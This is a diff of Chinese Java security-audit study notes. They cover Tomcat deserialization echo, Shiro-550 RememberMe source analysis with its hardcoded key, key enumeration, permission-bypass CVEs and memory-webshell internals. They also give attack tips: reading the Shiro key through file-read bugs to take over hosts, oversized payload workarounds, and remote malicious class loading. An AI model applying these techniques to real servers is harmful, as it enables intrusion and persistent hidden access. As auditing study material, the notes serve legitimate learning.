@@ -2,21 +2,27 @@
 
 > 学习资料：https://github.com/HackJava/HackJava
 >
-> [Java Web安全](https://www.bookstack.cn/read/anbai-inc-javaweb-sec/README.md)
+> [Java Web安全](https://www.bookstack.cn/read/anbai-inc-javaweb-sec/README.md)  一个简单的java审计教程
 >
-> **《Java安全漫谈》**:https://github.com/phith0n/JavaThings
+> **《Java安全漫谈》**:https://github.com/phith0n/JavaThings   主要是反射，反序列化，必看
 >
-> https://www.cnblogs.com/nice0e3/default.html?page=1  
+> https://www.freebuf.com/column/3143 反射，反序列化，shiro，log4j，fastjson漏洞分析
 >
-> https://sumsec.me/
+> 
 >
-> https://www.freebuf.com/column/3143 代码审计的学习笔记
+> https://www.cnblogs.com/nice0e3/default.html?page=1  代码审计学习，各种都有
 >
 > https://github.com/Firebasky/Java java安全笔记
+>
+> 
+>
+> https://sumsec.me/ codeql与代码审计
 >
 > java代码审计的checklist：https://xz.aliyun.com/t/3358
 >
 > java漏洞复现：https://github.com/threedr3am/learnjavabug
+>
+> 
 >
 > 其他
 >
@@ -3508,6 +3514,10 @@ serialVersionUID是什么？
 - weblogic下的rmi绑定实例
 - 待补充
 
+#### linux下文件操作符回显
+
+- [《linux下java反序列化通杀回显方法的低配版实现》](https://xz.aliyun.com/t/7307) 将回显结果写入文件操作符
+
 #### 中间件回显
 
 > https://www.cnblogs.com/nice0e3/p/14891711.html
@@ -3516,26 +3526,25 @@ serialVersionUID是什么？
 - 只要能拿到`request，Response`对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。
 
 - 但是很多框架对于Serlvet进行了封装，不同框架实现不同，同一框架的不同版本实现也可能不同，因此我们无法利用一种简单通用的方法去获取当前请求的response。
-- `request，response`的关键点是**寻找当前运行代码的上下文环境与Tomcat运行上下文环境之间的联系**。
+- `request，response`的关键点是**寻找当前运行代码（一次http请求中的环境）的上下文环境与Tomcat运行上下文环境之间的联系**。
 
-中间件而言多数重写了thread类，在thread中保存了req和resp，可以通过获取当前线程，在resp中写入回显结果
+- **中间件而言多数重写了thread类，在thread中保存了req和resp，可以通过获取当前线程，在resp中写入回显结果**
 
-这种方法前几天在先知上有很多针对tomcat无回显的文章，为各位师傅的文章画一下时间线：
-
-1. [《基于内存 Webshell 的无文件攻击技术研究》](https://www.anquanke.com/post/id/198886) 主要应用于Spring
-2. [《linux下java反序列化通杀回显方法的低配版实现》](https://xz.aliyun.com/t/7307) 将回显结果写入文件操作符
-3. [《Tomcat中一种半通用回显方法》](https://xz.aliyun.com/t/7348) 将执行命令的结果存入tomcat的response返回 shiro无法回显
-4. [《基于tomcat的内存 Webshell 无文件攻击技术》](https://xz.aliyun.com/t/7388) 动态注册filter实现回显 shiro无法回显
-5. [《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3) 通过Thread.currentThread.getContextClassLoader() 拿到request、response回显 tomcat7中获取不到StandardContext
-6. [《tomcat不出网回显连续剧第六集》](https://xz.aliyun.com/t/7535) 直接从Register拿到process对应的req
-
-不再赘述了，具体实现文章都有了。值得一提的思路可能就是反序列化不仅仅可以回显，也可以配合反射和字节码动态注册servlet实现无内存webshell。
+不再赘述了，具体实现文章都有了。值得一提的思路可能就是反序列化不仅仅可以回显，也可以配合反射和字节码动态生成内存马
 
 ##### Tomcat通用回显
 
 > 不同tomcat版本还有差别,不过有通杀poc
 >
-> https://www.anquanke.com/post/id/256966
+
+其他的一些Tomcat回显分析：
+
+- [《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3) 通过Thread.currentThread.getContextClassLoader() 拿到request、response回显 tomcat7中获取不到StandardContext
+- [《tomcat不出网回显连续剧第六集》](https://xz.aliyun.com/t/7535) 直接从Register拿到process对应的req
+
+tomcat通杀poc：
+
+- https://www.anquanke.com/post/id/256966
 
 ###### 寻找Request/Response：
 
@@ -3624,6 +3633,8 @@ serialVersionUID是什么？
                 ```
 
     - 总结：调用链中的AbstractProtocol的内部类ConnectionHandler中在处理的时候就将当前的Processor的信息存储在了global中。
+
+    - 有个问题，这个process是我们一次http请求生成的，那么服务器有很多个请求，怎么判断这个process是我们的。
 
 - 下个断点调试一下
 
@@ -3886,6 +3897,8 @@ serialVersionUID是什么？
 
 - 获取到Processor对象之后，接着获取`Request`和`Response`
 
+    - > 这里有个问题，一个http请求会有一个Processor对象，那么数据里面会有其他人的resp和req，那我们可以判断http头有没有cmd字段，有就处理这个req。
+
     - ```java
         for (int j = 0; j < processors.size(); ++j) {
                         Object processor = processors.get(j);
@@ -4038,9 +4051,15 @@ public class HelloWorld {
 
 
 
+###### 一些疑问
 
+- 我们可不可以下个断点，然后直接分析jvm生成了哪些对象，这些对象被哪些对象保存了，这样找resp对象就很方便了
+    - eclipse有mat，idea有jprofiler。尝试使用jprofiler，但是没有找到断点下下载内存转储文件的方法。而resp的寻找需要在一次http请求里面。
+    - 找到了，除了有⼤名鼎鼎的 [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)，还有 c0y1 师傅写的[ java-object-searcher] (https://github.com/c0ny1/java-object-searcher)，⼀款内存对象搜索⼯具，非常符合目前的需求。（来源 Koalr师傅）
 
 ##### Tomcat半通用回显
+
+- [《Tomcat中一种半通用回显方法》](https://xz.aliyun.com/t/7348) 将执行命令的结果存入tomcat的response返回 shiro无法回显
 
 ##### weblogic回显
 
@@ -4086,7 +4105,7 @@ public class HelloWorld {
 
 
 
-##### **Shiro-550  (CVE-2016-4437)**
+##### **Shiro-550  (CVE-2016-4437 1.2.4)**
 
 - **漏洞影响版本：Apache Shiro <= 1.2.4**
 - shiro特征：
@@ -4128,6 +4147,285 @@ public class HelloWorld {
   
 
   - 所以知道了key就可以构造反序列化了注入了。**因为shiro的反序列化重写了一部分，所以一部分cc链没办法使用，但是还是有可以使用的cc链。**
+
+- shiro源码分析
+
+    - shiro核心源码在core依赖里面
+
+        - ![image-20221103193447263](./java代码审计.assets/image-20221103193447263.png)
+
+        - shiro硬编码的key在`mgt/AbstractRememberMeManager下`
+            - ![image-20221103194715210](./java代码审计.assets/image-20221103194715210.png)
+
+            - 
+
+        - 思考一下在哪里加断点
+            - Remember me的作用就是，一次登录，后面在有效期内免登录。
+
+            - 那么登录后，每次访问login页面，都会对身份校验，解析Cookies中的RememberMe，所以只要找到解析Cookie的函数就可以。
+
+    - 加密过程
+
+        - 同样上面的类里面有个`onSuccessfulLogin`函数，应该是登录成功后调用，下断点。
+
+            - ```java
+                public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
+                        //always clear any previous identity:
+                        forgetIdentity(subject);
+                
+                        //now save the new identity:
+                        if (isRememberMe(token)) {
+                            rememberIdentity(subject, token, info);
+                        } else {
+                            if (log.isDebugEnabled()) {
+                                log.debug("AuthenticationToken did not indicate RememberMe is requested.  " +
+                                        "RememberMe functionality will not be executed for corresponding account.");
+                            }
+                        }
+                    }
+                ```
+
+        - 看一下函数，猜测是登陆成功之后先清除之前的Identity，然后创建新Identity（防止之前的认证信息被复用）
+
+        - 进入rememberIdentity方法，先将身份信息转byte，再将它序列化。再加密，返回
+
+            - ```java
+                public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
+                        PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);
+                        rememberIdentity(subject, principals);
+                }
+                
+                protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
+                        byte[] bytes = convertPrincipalsToBytes(accountPrincipals);
+                        rememberSerializedIdentity(subject, bytes);
+                }
+                
+                ```
+
+            - ```java
+                protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
+                        byte[] bytes = serialize(principals);
+                        if (getCipherService() != null) {
+                            bytes = encrypt(bytes);
+                        }
+                        return bytes;
+                    }
+                ```
+
+        - 这里的加密是
+
+            - ```java
+                public ByteSource encrypt(byte[] plaintext, byte[] key) {
+                        byte[] ivBytes = null;
+                        boolean generate = isGenerateInitializationVectors(false);
+                        if (generate) {
+                            ivBytes = generateInitializationVector(false);
+                            if (ivBytes == null || ivBytes.length == 0) {
+                                throw new IllegalStateException("Initialization vector generation is enabled - generated vector" +
+                                        "cannot be null or empty.");
+                            }
+                        }
+                        return encrypt(plaintext, key, ivBytes, generate);
+                    }
+                ```
+
+            - 使用javax.crypto.Cipher对象进行加密的，这里的mode是加密模式（这里的mode对应模式是AES的CBC模式），key就是shirokey，iv是向量，不同的iv生成的加密结果不同，解密时需要使用相同的iv才能解密
+
+            - 看下iv的生成方式，，随机生成的
+
+            - 那么shiro是怎么解密的呢
+
+                - 看下解密的iv获取方式，直接取加密的序列化对象前16位做iv
+                - 因为在加密时，iv会拼接在加密结果前面，所以加密后的内容前16位就是iv（iv作用就是可以使每次加密结果都不一样，不是用来解密的，所以可以直接明文，key才是用来解密的）
+
+        - 再进入rememberSerializedIdentity方法，会将身份信息序列化，写入Cookie
+
+            - ```java
+                    protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {
+                
+                        if (!WebUtils.isHttp(subject)) {
+                            if (log.isDebugEnabled()) {
+                                String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet " +
+                                        "request and response in order to set the rememberMe cookie. Returning immediately and " +
+                                        "ignoring rememberMe operation.";
+                                log.debug(msg);
+                            }
+                            return;
+                        }
+                
+                
+                        HttpServletRequest request = WebUtils.getHttpRequest(subject);
+                        HttpServletResponse response = WebUtils.getHttpResponse(subject);
+                
+                        //base 64 encode it and store as a cookie:
+                        String base64 = Base64.encodeToString(serialized);
+                
+                        Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies
+                        Cookie cookie = new SimpleCookie(template);
+                        cookie.setValue(base64);
+                        cookie.saveTo(request, response);
+                    }
+                ```
+
+        - 以上就是生成RememberMe的过程，经历过了加密，那使用到RememberMe的时候一定会经历解密
+
+    - 解密过程
+
+        - 在encrypt方法所在类(AbstractRememberMeManager类)，发现了decrypt方法，加断点。
+        - 调用栈如图
+            - ![image-20221103200039261](./java代码审计.assets/image-20221103200039261.png)
+
+        - 查看之前的调用栈，发现从subjectContext中提取Identity（Identity应该包含了RememberMe的信息），然后对cookie进行解密。
+
+            ```java
+                public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
+                    PrincipalCollection principals = null;
+                    try {
+                        byte[] bytes = getRememberedSerializedIdentity(subjectContext);
+                        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
+                        if (bytes != null && bytes.length > 0) {
+                            principals = convertBytesToPrincipals(bytes, subjectContext);
+                        }
+                    } catch (RuntimeException re) {
+                        principals = onRememberedPrincipalFailure(re, subjectContext);
+                    }
+            
+                    return principals;
+                }
+            ```
+
+        - 查看一下Identity提取了什么
+
+            - ```java
+                    protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {
+                
+                        if (!WebUtils.isHttp(subjectContext)) {
+                            if (log.isDebugEnabled()) {
+                                String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
+                                        "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
+                                        "immediately and ignoring rememberMe operation.";
+                                log.debug(msg);
+                            }
+                            return null;
+                        }
+                
+                        WebSubjectContext wsc = (WebSubjectContext) subjectContext;
+                        if (isIdentityRemoved(wsc)) {
+                            return null;
+                        }
+                
+                        HttpServletRequest request = WebUtils.getHttpRequest(wsc);
+                        HttpServletResponse response = WebUtils.getHttpResponse(wsc);
+                
+                        String base64 = getCookie().readValue(request, response);
+                        // Browsers do not always remove cookies immediately (SHIRO-183)
+                        // ignore cookies that are scheduled for removal
+                        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;
+                
+                        if (base64 != null) {
+                            base64 = ensurePadding(base64);
+                            if (log.isTraceEnabled()) {
+                                log.trace("Acquired Base64 encoded identity [" + base64 + "]");
+                            }
+                            byte[] decoded = Base64.decode(base64);
+                            if (log.isTraceEnabled()) {
+                                log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
+                            }
+                            return decoded;
+                        } else {
+                            //no cookie set - new site visitor?
+                            return null;
+                        }
+                    }
+                ```
+
+        - 这里的base64正是burp传入的cookie，
+
+        - 然后对cookie执行ensurePadding方法，然后base64解码，返回
+
+            - ```
+                if (base64 != null) {
+                            base64 = ensurePadding(base64);
+                            
+                      		byte[] decoded = Base64.decode(base64);      
+                ```
+
+            - 看下ensurePadding方法，如图，是填充=的
+
+                - ```java
+                        private String ensurePadding(String base64) {
+                            int length = base64.length();
+                            if (length % 4 != 0) {
+                                StringBuilder sb = new StringBuilder(base64);
+                                for (int i = 0; i < length % 4; ++i) {
+                                    sb.append('=');
+                                }
+                                base64 = sb.toString();
+                            }
+                            return base64;
+                        }
+                    ```
+
+        - 回到getRememberedPrincipals方法，bytes就是返回的base64解码后的cookie。然后传入convertBytesToPrincipals方法。
+
+            -  ```java
+                     protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
+                         if (getCipherService() != null) {
+                             bytes = decrypt(bytes);
+                         }
+                         return deserialize(bytes);
+                     }
+                 ```
+
+        - 然后解密cookie
+
+            - ```java
+                    protected byte[] decrypt(byte[] encrypted) {
+                        byte[] serialized = encrypted;
+                        CipherService cipherService = getCipherService();
+                        if (cipherService != null) {
+                            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
+                            serialized = byteSource.getBytes();
+                        }
+                        return serialized;
+                    }
+                ```
+
+            - 首先通过CipherService对象，对RememberMe解密，这时候是传入默认key解密，然后返回byte数组
+
+        - 然后反序列化
+
+            - ```java
+                protected PrincipalCollection deserialize(byte[] serializedIdentity) {
+                	return getSerializer().deserialize(serializedIdentity);
+                }
+                
+                
+                ```
+
+            - ```java
+                    public T deserialize(byte[] serialized) throws SerializationException {
+                        if (serialized == null) {
+                            String msg = "argument cannot be null.";
+                            throw new IllegalArgumentException(msg);
+                        }
+                        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
+                        BufferedInputStream bis = new BufferedInputStream(bais);
+                        try {
+                            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);//这个方法shiro在里面重写了一个方法，导致我们后面的cc链会出现问题，后面会讲。
+                            @SuppressWarnings({"unchecked"})
+                            T deserialized = (T) ois.readObject();
+                            ois.close();
+                            return deserialized;
+                        } catch (Exception e) {
+                            String msg = "Unable to deserialze argument byte array.";
+                            throw new SerializationException(msg, e);
+                        }
+                    }
+                }
+                ```
+
+            - 
 
 - 对此，我们攻击过程如下： 
 
@@ -4524,16 +4822,57 @@ public class HelloWorld {
 
 漏洞修复：
 
-- 
+- HW时可能需要暂时修改key，防止当前点被友商攻击，那可以通过反射，修改DEFAULT CIPHER KEY的值，，由于当前DEFAULT CIPHER KEY的值存于JVM方法区，当站点重启时，又会重新加载类，JVM中的key就会恢复，所以这种方式修改是暂时的
+- 想永久的修改key，可以修改或设置Shiro的配置文件
+- **shiro官方在1.2.4版本之后，改成了随机生成key，但是也可以自己设置key。**
+- 在 Shiro 1.2.4 及之前的 版本，Shiro 秘钥是硬编码的⼀个值 `kPH+bIxk5D2deZiIxcaaaA==` ，这便是 Shiro550 的漏洞成因。**但这个漏洞不只存在于 1.2.4 版本，**后续版本的读取流程没有什么改动。这就意味着只要秘钥泄露，依然存在⾼危⻛险。**有趣的是，国内不少程序员习惯性 的 copy/paste，⼀些 Github 示例代码被直接复制到了项⽬中，这些示例中设置秘钥 的代码也可能被⼀并带到项⽬中，这就给了安全⼈员可乘之机，后来出现的 Shiro Top 100 Key 便是基于此原理收集**的，这⼤概也是该漏洞经久不衰的⼀个侧⾯因素吧。
 
 ##### shiro的自动化检测
 
-- 使⽤⼀个空的 SimplePrincipalCollection 作为 payload，序列化后使⽤待 检测的秘钥进⾏加密并发送，秘钥正确和错误的响应表现是不⼀样的，可以使⽤这 个⽅法来可靠的枚举 Shiro 当前使⽤的秘钥。
+> https://github.com/SummerSec/ShiroAttack2   shiro的利用工具，非常全面，可以学习是怎么构建poc的
+>
+> 来源Koalr师傅
+
+- 探测是否存在shiro框架，输入错误的cookie会返回deleteMe字段。比如输入 **rememberMe=1** ，然后再来看 **response** 的 **set-cookie** 是否出现的 **rememberMe=deleteMe** 。
+
+- 爆破密钥：
+
+    - > https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ
+
+    - 使⽤⼀个空的 `SimplePrincipalCollection` 作为 payload，序列化后使⽤待 检测的秘钥进⾏加密并发送，秘钥正确和错误的响应表现是不⼀样的，可以使⽤这 个⽅法来可靠的枚举 Shiro 当前使⽤的秘钥。
+
+    - 另外有个⼩插曲是，有的⽹站没法根据是否存在 deleteMe 来判断，⽽是需要根据 deleteMe 的数量来判断，举个例⼦，如果秘钥错误，返回的是两个 deleteMe ，反之返回的是⼀个 deleteMe 。
+
 - 借助这种⽅法，我们就可以将 Shiro 的检测拆为两步 
     1.  探测 Shiro Key，如果探测成功，则报出秘钥可被枚举的漏洞；如果探测失败直 接结束逻辑 
-    2.  利⽤上⼀步获得的 Shiro Key，尝试 Tomcat 回显，如果成功再报出⼀个远程代码执⾏的漏洞
-- 由于第⼀步的检测依靠的是 Shiro 本身的代码逻辑，可以完全不受环境的影响，只要 ⽬标使⽤的秘钥在我们待枚举的列表⾥，那么就⾄少可以把 Key 枚举出来，这就很⼤ 的提⾼了漏洞检测的下限。
-- 另外有个⼩插曲是，有的⽹站没法根据是否存在 deleteMe 来判断，⽽是需要根据 deleteMe 的数量来判断，举个例⼦，如果秘钥错误，返回的是两个 deleteMe ，反之返回的是⼀个 deleteMe 。这
+    2.  利⽤上⼀步获得的 Shiro Key，尝试 Tomcat 回显或者dnslog
+
+- 由于第⼀步的检测依靠的是 Shiro 本身的代码逻辑，可以完全不受环境的影响，只要目标使⽤的秘钥在我们待枚举的列表⾥，那么就⾄少可以把 Key 枚举出来，这就很大的提⾼了漏洞检测的下限。
+
+- poc利用链收集
+
+    - cc6的source（lazymap）+cc3的sink（TemplatesTmpl ）
+    - cb链
+
+- 还要思考一些问题
+
+    - 如何判断⽬标是 Shiro 的站点，Nginx 反代动静分离的站点⼜该怎么识别？
+    -  如何避免 Java 依赖⽽纯粹使⽤其他语⾔实现？
+    -  如何避免 Payload 太⻓以致超过 Tomcat Header 的⼤⼩限制？ 
+    - 如何使 Payload 兼容 JDK6 的环境？ 
+    - CommonsBeanutils 中有个类的 serialVersionUID 没设置会对 gadget 有什 么影响？ 
+    - 如何识别并处理 Cookie key 不是 rememberMe 的情况？
+
+##### 实战小技巧
+
+- 实战中，网站可能会有任意文件读取漏洞，而且刚好用了shiro
+    那就可以通过任意文件读取，读取ShiroKey，然后通过shiro反序列化，获得主机权限
+    路径一般是网站目录下的/WEB-INF/classes/spring-shrio.xml或spring-context-shiro.xml等
+- poc长度太长了，cookie里面放不下
+    - 解决方法
+        1. 先构造个payload，通过反射修改org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，把这个值改大一点
+        2. 使用CloassLoader，加载远程恶意类（需要机器出网，不出网的话，可以配合本地文件上传，例如上传头像之类的）
+        3. 使用body传递字节码，加载body中的class
 
 ##### Shiro-721(CVE-2019-12422)
 
@@ -4548,11 +4887,717 @@ public class HelloWorld {
   2.URL中有shiro字样
   3.有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可
 
-- 在1.2.4版本后，shiro已经更换 AES-CBC AES-CBC 为 AES-GCM AES-GCM ，无法再通过Padding Oracle遍历key。
+- 官方修复
+
+    - 在1.4.2版本后，shiro 721 漏洞爆出来之后 shiro 决定在 1.50 把默认的加密模式 CBC 改成了更安 全的 GCM，来修复这个问题 也就是说 2020 年 1 月 21 号之后的版本加密模式都改为了 AES/GCM/NoPadding。
+
+
+#### shiro权限绕过(不是反序列化漏洞)
+
+##### 基础
+
+- 绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。
+
+- | CVE编号        | Shiro可利⽤版本 | 核心利⽤点          |
+    | -------------- | --------------- | ------------------- |
+    | ⽆             | Shiro < 1.5.0   | 尾斜杠              |
+    | CVE-2020-1957  | Shiro < 1.5.2   | 分号截断            |
+    | CVE-2020-11989 | Shiro < 1.5.3   | ContextPath分号截断 |
+    | CVE-2020-13933 | Shiro < 1.6.0   | Urldecode顺序不同   |
+
+- 其中CVE-2020-11989与CVE-2020-13933均有⼀定的利⽤条件，⽐如设置ContextPath、设置路由 处理⽅式等
+
+##### Shiro < 1.5.0
 
 ##### 权限绕过漏洞（CVE-2020-1957）
 
+##### CVE-2020-11989
+
+##### CVE-2020-13933
+
 ## 内存马
+
+> https://www.anquanke.com/post/id/266240
+>
+> java web基础
+
+为什么会使用内存马？
+
+- 传统Webshell连接方式，都是先通过某种漏洞将恶意的脚本木马文件上传，然后通过中国菜刀，或者蚁剑，冰蝎等Webshell管理软件进行链接。
+- 这种方式目前仍然流行，但是由于近几年防火墙，IDS，IPS，流量分析等各种安全设备的普及和更新，这种连接方式非常容易被设备捕获拦截，而且由于文件是明文存放在服务器端，所以又很容易被杀毒软件所查杀。在今天看来这种传统连接方式显然已经过时，于是乎，进化了一系列的加密一句话木马，但是这种方式还是不能绕过有类似文件监控的杀毒软件，于是乎进化了新一代的Webshell---》内存马
+
+什么是内存马
+
+- 内存马是无文件Webshell，什么是无文件webshell呢？
+    - 简单来说，就是服务器上不会存在需要链接的webshell脚本文件。
+- 那有的同学可能会问了？这种方式为什么能链接呢？
+    - 内存马的原理就像是MVC架构，即通过路由访问控制器，我通过自身的理解，概述的说一下， **内存马的原理就是在web组件或者应用程序中，注册一层访问路由，访问者通过这层路由，来执行我们控制器中的代码**
+
+如何实现webshell内存马
+
+- 目标：访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果
+- 实现：以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。
+- ![image-20220426170053909](./java代码审计.assets/image-20220426170053909.png)
+
+### 内存马类型
+
+根据内存马注入的方式，大致可以将内存马划分为如下两类
+
+1. servlet-api型
+    - 通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马
+
+2. 字节码增强型: Java Agent内存马。
+    - 通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。
+
+在特定框架里，如Spring/Struts2等框架，按照位置分类可以有
+
+- interceptor型
+- controller型
+
+同时，针对不同的中间件还有不同的类型
+
+- Tomcat的Pipeline&Valve
+- Grizzly的FilterChain&Filter等等
+
+内存马注入点：
+
+- jsp注入
+- 代码执行漏洞注入
+
+### tomcat基础
+
+![image-20220425212422521](./java代码审计.assets/image-20220425212422521.png)
+
+Tomcat是一个Servlet容器，其中包括了Container、Engine、Host、Context、Wrapper等模块功能。
+
+**Server**：表示整个 Tomcat Catalina servlet 容器，Server 中可以有多个 Service。tomcat 默认的 Service 服务是 Catalina。
+
+- **Service：**
+
+    - 表示Connector和Engine的组合，对外提供服务，Service可以包含多个Connector和一个Engine。
+
+    - Connector：
+
+        - 为Tomcat Engine的**连接组件**，支持三种协议：HTTP/1.1、HTTP/2.0、AJP。作。**向外提供端口，从端口中接受数据，并封装成Request对象传递给Container组件。**
+        - 连接器与容器之间通过 ServletRequest 和 ServletResponse 对象进行交流。
+
+    - **Container：**
+
+        - 容器（Container）主要包括四种，Engine、Host、Context和Wrapper。也就是这个图中包含的四个子容器。
+
+        - ![image-20220425213832746](./java代码审计.assets/image-20220425213832746.png)
+
+        - 由下图可以看出，Container在处理请求时使用的Pipeline管道，Pipeline 是一个很常用的处理模型，和 FilterChain 大同小异，都是责任链模式的实现，Pipeline 内部有多个 Valve，这些 Valve 因栈的特性都有机会处理请求和响应。上层的Valve会调用下层容器管道，一步一步执行到FilterChain过滤链。
+
+        - **Engine：**
+
+            - > 顶级容器，不能被其他容器包含，它接受处理连接器的所有请求，并将响应返回相应的连接器，子容器通常是 Host 或 Context。
+
+            - **Host：**表示一个虚拟主机（表示的就是一个网站了），包含主机名称和IP地址，这里默认是localhost。
+
+                - **Context**：
+
+                    - > - **表示一个 Web 应用程序，是 Servlet、Filter 的父容器。**
+                        > - servletContext负责的是servlet运行环境上下信息，不关心session管理，cookie管理，servlet的加载，servlet的选择问题，请求信息，主要负责servlet的管理。
+                        > - **StandardContext主要负责管理session，Cookie，Servlet的加载和卸载，负责请求信息的处理，掌握控制权。**
+                        > - ServletContext主要是适配Servlet规范（是一个接口），StandardContext是tomcat的一种容器.**Tomcat中的对应的ServletContext实现是ApplicationContext。**
+
+                    - **在Tomcat中对应的ServletContext实现是ApplicationContext**。Tomcat惯用Facade方式，因此在web应用程序中获取到的ServletContext实例实际上是一个ApplicationContextFacade对象，对ApplicationContext实例进行了封装。**而ApplicationContext实例中含有Tomcat的Context容器实例（StandardContext实例，也就是在server.xml中配置的Context节点），以此来获取/操作Tomcat容器内部的一些信息，例如获取/注册servlet等。Filter内存马的实现也是基于此知识点获取到了存储在StandardContext中的filterConfigs HashMap结构。**
+
+                    - **Wrapper：**
+
+                        - 表示一个 Servlet，它负责管理 Servlet 的生命周期，并提供了方便的机制使用拦截器。
+
+- ![image-20220426171601970](./java代码审计.assets/image-20220426171601970.png)
+
+- ![image-20220425213204064](./java代码审计.assets/image-20220425213204064.png)
+
+### tomcat—Filter内存马
+
+> https://www.freebuf.com/articles/web/274466.html
+>
+> https://www.cnblogs.com/bmjoker/p/15114884.html
+
+StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper.
+
+相关Filter类介绍
+
+- filterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例等基本信息
+    - ![img](./java代码审计.assets/1628239243972-cfeb63e5-a9e0-467b-8511-cfa3a5ff3447.png)
+
+- filterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息
+    - ![img](./java代码审计.assets/1628239184622-7a5630d0-9d2a-4603-9e25-f9ba49f068bd.png)
+
+- filterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern
+    - ![img](./java代码审计.assets/1628239302502-279f0b90-084f-4160-9dfc-9fa3ba17e1e9.png)
+- FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter
+    - ![img](./java代码审计.assets/1628239041836-7b566fa9-4de8-4c52-bc6a-9380bdc64568.png)
+
+
+- 当我们写好filter时候，Tomcat是怎么调用的呢？
+
+    - 根据请求的URL从**FilterMaps**(从 context 中获取的 FilterMaps)中找出与之URL对应的**Filter Def**
+    - 根据Filter Def去**FilterConfigs**中寻找对应名称的FilterConfig
+    - **找到对应的FilterConfig 之后添加到FilterChain中**，并且返回FilterChain
+    - filterChain中调用internalDoFilter遍历获取chain中的FilterConfig，然后从FilterConfig中获取Filter，然后调用Filter的 doFilter方法
+    - ![image-20220426191800504](./java代码审计.assets/image-20220426191800504.png)
+
+- 创建两个Filte
+
+    ```java
+    package com.sec.servlet;
+    
+    import javax.servlet.*;
+    import java.io.IOException;
+    
+    public class FilterDemo2 implements Filter {
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException {
+            System.out.println("第二个Filter 初始化创建");
+        }
+        @Override
+        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            System.out.println("第二个Filter执行过滤操作");
+            filterChain.doFilter(servletRequest,servletResponse);
+        }
+        @Override
+        public void destroy() {
+        }
+    }
+    ```
+
+    ```xml
+      <filter>
+        <filter-name>filterDemo</filter-name>
+        <filter-class>com.sec.servlet.FilterDemo</filter-class>
+      </filter>
+    
+      <filter-mapping>
+        <filter-name>filterDemo</filter-name>
+        <url-pattern>/*</url-pattern>
+      </filter-mapping>
+    
+      <filter>
+        <filter-name>filterDemo2</filter-name>
+        <filter-class>com.sec.servlet.FilterDemo2</filter-class>
+      </filter>
+    
+      <filter-mapping>
+        <filter-name>filterDemo2</filter-name>
+        <url-pattern>/*</url-pattern>
+      </filter-mapping>
+    ```
+
+    访问主页输出
+
+    ```
+    第二个Filter 初始化创建
+    第一个Filter 初始化创建
+    [2022-04-26 07:44:51,388] 工件 simpleweb:war: 工件已成功部署
+    [2022-04-26 07:44:51,388] 工件 simpleweb:war: 部署已花费 853 毫秒
+    第一个Filter执行过滤操作
+    第二个Filter执行过滤操作
+    第一个Filter执行过滤操作
+    第二个Filter执行过滤操作
+    ```
+
+    Filter的配置在web.xml中，Tomcat会首先通过ContextConfig创建WebXML的实例来解析web.xml
+
+    先来看在StandardWrapperValue.java文件中中利用createFilterChain来创建filterChain
+
+    ```java
+    // Create the filter chain for this request
+    ApplicationFilterChain filterChain =
+    ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
+    ```
+
+    跟进createFilterChain方法
+
+    ```java
+    // Acquire the filter mappings for this Context
+    StandardContext context = (StandardContext) wrapper.getParent();
+    FilterMap filterMaps[] = context.findFilterMaps();
+    ```
+
+    通过getParent()获取当前的Context，也就是当前的应用，然后从Context中获取filterMaps
+
+    ![img](./java代码审计.assets/1628241005723-d3a2dd82-e33d-4df5-804a-bcd56d19089b.png)
+
+    然后开始遍历FilterMaps
+
+    ```java
+    // Add the relevant path-mapped filters to this filter chain
+    for (int i = 0; i < filterMaps.length; i++) {
+        if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
